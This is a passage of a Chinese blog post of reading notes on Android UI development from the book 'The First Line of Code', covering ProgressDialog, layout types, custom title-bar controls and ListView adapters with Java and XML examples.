is dialog&quot;);</span><br><span class="line">              progressDialog.setMessage(&quot;Something Important&quot;);</span><br><span class="line">              progressDialog.setCancelable(false);</span><br><span class="line">              progressDialog.show();         </span><br><span class="line">              break;</span><br><span class="line">        default:</span><br><span class="line">              break;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，progressDialog.setCancelable(false)传入false，表示不能通过Back键取消掉，必须通过调用dismiss()来关闭对话框。</p><h3 id="4种基本布局"><a href="#4种基本布局" class="headerlink" title="4种基本布局"></a>4种基本布局</h3><h4 id="LinearLayout"><a href="#LinearLayout" class="headerlink" title="LinearLayout"></a>LinearLayout</h4><p>控件垂直线性排列</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">android:<span class="attribute">orientation</span>=<span class="string">&quot;vertical&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button1&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_1&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button2&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_2&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button3&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_3&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>控件水平线性排列</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">android:<span class="attribute">orientation</span>=<span class="string">&quot;horizontal&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button1&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_1&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button2&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_2&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button3&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_3&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>如果不指定android:orientation，默认排列方向水平</p><p><strong>android:layout_gravity</strong>：用于指定控件在布局中对齐方式，需注意当线性布局排列方向是水平时，只有垂直方向的对齐方式才会生效，同理当线性布局排列方向是垂直时，只有水平方向的对齐方式才会生效</p><p><strong>android:layout_gravity</strong>使用如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">android:<span class="attribute">orientation</span>=<span class="string">&quot;horizontal&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button1&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_gravity</span>=<span class="string">&quot;top&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_1&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button2&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_2&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button3&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_gravity</span>=<span class="string">&quot;bottom&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_3&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p><strong>android:layout_weight</strong>：设置控件比例大小</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;EditText</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/input_message&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span></span><br><span class="line">        android:<span class="attribute">hint</span>=<span class="string">&quot;input&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button1&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span></span><br><span class="line">        android:<span class="attribute">text</span>=<span class="string">&quot;Button_1&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>使用了weight属性，此时控件宽度不再由layout_width决定，且<code>android:layout_width=&quot;0dp&quot;</code>是比较规范写法，这里dp表示控件大小或者间距</p><h4 id="相对布局RelativeLayout"><a href="#相对布局RelativeLayout" class="headerlink" title="相对布局RelativeLayout"></a>相对布局RelativeLayout</h4><p>控件相对于布局进行定位</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">android:</span>layout_alignParentL<span class="attr">eft</span><span class="operator">=</span><span class="string">&quot;true&quot;</span>  <span class="comment">//位于布局左边</span></span><br><span class="line"><span class="symbol">android:</span>layout_alignParentR<span class="attr">ight</span><span class="operator">=</span><span class="string">&quot;true&quot;</span> <span class="comment">//位于布局右边</span></span><br><span class="line"><span class="symbol">android:</span>layout_alignParentT<span class="attr">op</span><span class="operator">=</span><span class="string">&quot;true&quot;</span>   <span class="comment">//位于布局顶边</span></span><br><span class="line"><span class="symbol">android:</span>layout_alignParentB<span class="attr">ottom</span><span class="operator">=</span><span class="string">&quot;true&quot;</span> <span class="comment">//位于布局底边</span></span><br><span class="line"><span class="symbol">android:</span>layout_centerInP<span class="attr">arent</span><span class="operator">=</span><span class="string">&quot;true&quot;</span>   <span class="comment">//位于布局中间</span></span><br></pre></td></tr></table></figure><p>控件相对于其他控件进行定位</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">android:</span>layout_<span class="attr">above</span><span class="operator">=</span><span class="string">&quot;@id/id—_name&quot;</span>   <span class="comment">//位于相比控件上面</span></span><br><span class="line"><span class="symbol">android:</span>layout_<span class="attr">below</span><span class="operator">=</span><span class="string">&quot;@id/id—_name&quot;</span>   <span class="comment">//位于相比控件下面</span></span><br><span class="line"><span class="symbol">android:</span>layout_toLeftOf=<span class="string">&quot;@id/id—_name&quot;</span>  <span class="comment">//位于相比控件左面</span></span><br><span class="line"><span class="symbol">android:</span>layout_toRightOf=<span class="string">&quot;@id/id—_name&quot;</span> <span class="comment">//位于相比控件右面</span></span><br></pre></td></tr></table></figure><p>另外一组</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">android:</span>layout_alignL<span class="attr">eft</span><span class="operator">=</span><span class="string">&quot;@id/id—_name&quot;</span>   <span class="comment">//一个组件左边缘和另一个组件左边缘对齐</span></span><br><span class="line"><span class="symbol">android:</span>layout_alignR<span class="attr">ight</span><span class="operator">=</span><span class="string">&quot;@id/id—_name&quot;</span>  <span class="comment">//一个组件右边缘和另一个组件右边缘对齐</span></span><br><span class="line"><span class="symbol">android:</span>layout_alignT<span class="attr">op</span><span class="operator">=</span><span class="string">&quot;@id/id—_name&quot;</span>   <span class="comment">//一个组件上边缘和另一个组件上边缘对齐</span></span><br><span class="line"><span class="symbol">android:</span>layout_alignB<span class="attr">ottom</span><span class="operator">=</span><span class="string">&quot;@id/id—_name&quot;</span>  <span class="comment">//一个组件下边缘和另一个组件下边缘对齐</span></span><br></pre></td></tr></table></figure><h4 id="帧布局"><a href="#帧布局" class="headerlink" title="帧布局"></a>帧布局</h4><p>这种布局没有方便的定位方式，组件默认摆放在布局左上角</p><p>也可以使用<code>android:layout_gravity</code>属性</p><h4 id="百分比布局"><a href="#百分比布局" class="headerlink" title="百分比布局"></a>百分比布局</h4><p>只有线性布局支持layout_weight属性，相对布局和帧布局不支持。为了使这两个也可以比例分割布局引用百分比布局。在这种布局不在使用wrap_content,match_parent等方式指定控件大小，而是直接指定控件在布局中所占的百分比。</p><p>百分比布局只为帧布局，相对布局进行功能拓展—&gt;PercentFrameLayout和PercentRelativeLayout</p><p><strong>百分比布局的使用</strong></p><p>在app/build.gradle添加依赖 <code>compile &#39;com.android.support:percent:24.2.1&#39;</code></p><p>最外层使用PercentFrameLayout，用完整包路径来表示，必须还定义一个app命名空间。</p><p>app:layout_heightPercent app:layout_widthPercent属性，指定百分比</p><h3 id="自定义控件"><a href="#自定义控件" class="headerlink" title="自定义控件"></a>自定义控件</h3><p>常用控件和布局的继承结构</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240719141008153.png" alt="image-20240719141008153"></p><h4 id="引用布局"><a href="#引用布局" class="headerlink" title="引用布局"></a>引用布局</h4><p><code>android:background</code>：为布局或者控件指定一个背景</p><p><code>android_layout_margin</code>：指定控件上下左右方向上偏移的距离。也可使用android_layout_marginTop等</p><p>在编写完标题布局，如下图</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240719152219494.png" alt="image-20240719152219494"></p><p>修改activity_main.xml中代码，添加如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;include <span class="attribute">layout</span>=<span class="string">&quot;@layout/title&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>同时将系统自带的标题栏隐藏</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    ActionBar actionBar=getSupportActionBar();</span><br><span class="line">    <span class="keyword">if</span>(actionBar!=<span class="literal">null</span>)&#123;</span><br><span class="line">        actionBar.hide();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="自定义控件-1"><a href="#自定义控件-1" class="headerlink" title="自定义控件"></a>自定义控件</h4><p>自定义控件实现上面两个Button功能，使不同活动点击这两个按钮时，分别实现各自功能，不用编写多次</p><p>新建类TitleLayout，继承LinearLayout,让他成为自定义标题栏控件,并注册按钮点击事件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TitleLayout</span> <span class="keyword">extends</span> <span class="title class_">LinearLayout</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TitleLayout</span><span class="params">(Context context, <span class="meta">@Nullable</span> AttributeSet attrs)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(context, attrs);</span><br><span class="line">        LayoutInflater.from(context).inflate(R.layout.title,<span class="built_in">this</span>);</span><br><span class="line">        Button titleBack=findViewById(R.id.title_back);</span><br><span class="line">        Button titleEdit=findViewById(R.id.title_edit);</span><br><span class="line">        titleBack.setOnClickListener(<span class="keyword">new</span> <span class="title class_">OnClickListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                ((Activity)getContext()).finish();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        titleEdit.setOnClickListener(<span class="keyword">new</span> <span class="title class_">OnClickListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                Toast.makeText(getContext(), <span class="string">&quot;You click Edit&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：在控件中使用TitleLayout控件就会调用构造函数，构造函数中对标题栏布局进行动态加载，进而绑定按钮</p><p>inflate()函数有两个参数：第一个是加载的布局id，第二个是父布局</p><p>同时修改activity_main.xml，布局文件中添加自定义控件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.example.uicustomviews.TitleLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ListView"><a href="#ListView" class="headerlink" title="ListView"></a>ListView</h3><h4 id="ListView的简单用法"><a href="#ListView的简单用法" class="headerlink" title="ListView的简单用法"></a>ListView的简单用法</h4><p>布局文件如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ListView</span><br><span class="line">    android:<span class="attribute">id</span>=<span class="string">&quot;@+id/list_view&quot;</span></span><br><span class="line">    android:<span class="attribute">layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">    android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>代码实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String[] data=&#123;<span class="string">&quot;Apple&quot;</span>,<span class="string">&quot;Banana&quot;</span>,<span class="string">&quot;Orange&quot;</span>,<span class="string">&quot;Watermelon&quot;</span>,<span class="string">&quot;Pear&quot;</span>,<span class="string">&quot;Grape&quot;</span>,<span class="string">&quot;Pineapple&quot;</span>,<span class="string">&quot;Strawberry&quot;</span>,<span class="string">&quot;Cherry&quot;</span>,<span class="string">&quot;Mango&quot;</span>,            <span class="string">&quot;Apple&quot;</span>,<span class="string">&quot;Banana&quot;</span>,<span class="string">&quot;Orange&quot;</span>,<span class="string">&quot;Watermelon&quot;</span>,<span class="string">&quot;Pear&quot;</span>,<span class="string">&quot;Grape&quot;</span>,<span class="string">&quot;Pineapple&quot;</span>,<span class="string">&quot;Strawberry&quot;</span>,<span class="string">&quot;Cherry&quot;</span>,<span class="string">&quot;Mango&quot;</span>&#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        ArrayAdapter&lt;String&gt; adapter = <span class="keyword">new</span> <span class="title class_">ArrayAdapter</span>&lt;String&gt;(MainActivity.<span class="built_in">this</span>, android.R.layout.simple_list_item_1,data);</span><br><span class="line">        <span class="type">ListView</span> <span class="variable">listview</span> <span class="operator">=</span> findViewById(R.id.list_view);</span><br><span class="line">        listview.setAdapter(adapter);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>借助ArrayAdapter适配器实现类，传入泛型String，</p><p><code>android.R.layout.simple_list_item_1</code>为ListView的子项布局id，系统内置的用于简单显示一段文本。</p><p>有了Adpter对象，用setAdapter方法将构建好的适配器对象传递进去，ListView和数据之间关联就建立完成。</p><h4 id="定制ListView的界面"><a href="#定制ListView的界面" class="headerlink" title="定制ListView的界面"></a>定制ListView的界面</h4><p>实现 显示水果图片，旁边是水果的名字</p><p>定义类，作为ListView适配器适配类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fruit</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> imageId;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Fruit</span><span class="params">(String name,<span class="type">int</span> imageId)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.imageId=imageId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getImageId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> imageId;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自定义子项布局</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/fruit_image&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/fruit_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_vertical&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginLeft</span>=<span class="string">&quot;10dp&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>自定义适配器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FruitAdapter</span> <span class="keyword">extends</span> <span class="title class_">ArrayAdapter</span>&lt;Fruit&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span>  <span class="type">int</span> resourceId;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FruitAdapter</span><span class="params">(Context context, <span class="type">int</span> textViewResourceId,</span></span><br><span class="line"><span class="params">                        List&lt;Fruit&gt; objects)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(context, textViewResourceId, objects);</span><br><span class="line">        resourceId = textViewResourceId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">getView</span><span class="params">(<span class="type">int</span> position, View convertView, ViewGroup parent)</span> &#123;</span><br><span class="line">        <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> getItem(position); <span class="comment">// 获取当前项的Fruit实例</span></span><br><span class="line">   </span><br><span class="line">            <span class="type">View</span> <span class="variable">view</span> <span class="operator">=</span> LayoutInflater.from(getContext()).inflate(resourceId, parent, <span class="literal">false</span>); <span class="comment">//加载子项布局</span></span><br><span class="line">        ImageView friutImage=(ImageView) view.findViewById (R.id.fruit_image);</span><br><span class="line">          TextView fruitName=(TextView) view.findViewById (R.id.fruit_name);</span><br><span class="line">            fruitImage.setImageResource(fruit.getImageId());</span><br><span class="line">            fruitName.setText(fruit.getName());     </span><br><span class="line">        <span class="keyword">return</span> view;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解析适配器</strong>：FruitApater构造方法，将上下文，子项布局ID，数据传递进来</p><p>重写getView方法，当每个子项滚动到界面内就会调用</p><p><strong>MainActivity</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span 